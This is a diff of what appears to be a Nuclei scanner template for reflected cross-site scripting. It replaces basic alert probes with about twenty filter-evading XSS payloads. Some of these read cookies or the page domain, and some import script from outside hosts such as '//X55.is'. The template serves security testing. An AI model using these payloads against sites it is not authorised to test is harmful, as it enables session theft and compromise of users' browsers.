@@ -1,35 +1,42 @@
-id: reflected-xss
+id: reflected-xss1
 
 info:
   name: Reflected Cross Site Scripting
-  author: pdteam
+  author: github.com/freelancermijan
   severity: medium
   tags: xss,rxss,dast
 
-variables:
-  first: "{{rand_int(10000, 99999)}}"
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
 
     payloads:
       reflection:
-        - "'\"><{{first}}"
-        - "<img src=x onerror=alert({{first}})>"
-        - "<script>alert({{first}})</script>"
-        - "'><ScRiPt>alert({{first}})</sCrIpT>"
-        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
-        - "</script><script>alert({{first}})</script>"
-        - "<body onload=alert({{first}})>"
-        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
-        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
-        - "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
-
+        - '"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>'
+        - "<Img Src=OnXSS OnError=confirm('Hacked_by_mijan')>"
+        - 'ab@gmail.com\"><svg/onload=alert(/xss/)>'
+        - 'KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui'
+        - "%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e"
+        - "><script%20>alert(document.domain)<%2fscript>"
+        - '"><img/src/onerror=import("//domain/")>"@yourdomain'
+        - "013371337;ext=<img/src/onerror=import('//domain/')>"
+        - "<Svg Only=1 OnLoad=confirm(document.domain)>"
+        - '<Svg/OnLoad=alert(1337)>"@gmail.com'
+        - '<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>'
+        - "<svg onload=alert&#0000000040document.cookie)>"
+        - '<svg onload=alert&#0000000040"1")><””>'
+        - '<Img Src=//X55.is OnLoad%0C=import(Src)>'
+        - "%3Csvg%20onload=alert(%22MrHex88%22)%3E"
+        - "%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E"
+        - '"><svg onmouseover="confirm&#0000000040document.domain)'
+        - "%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o"
+        - 'javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")'
+        - "<Script>window.valueOf=alert;window%2B1</Script>"
     fuzzing:
       - part: query
-        type: postfix
+        type: replace
         mode: single
         fuzz:
           - "{{reflection}}"
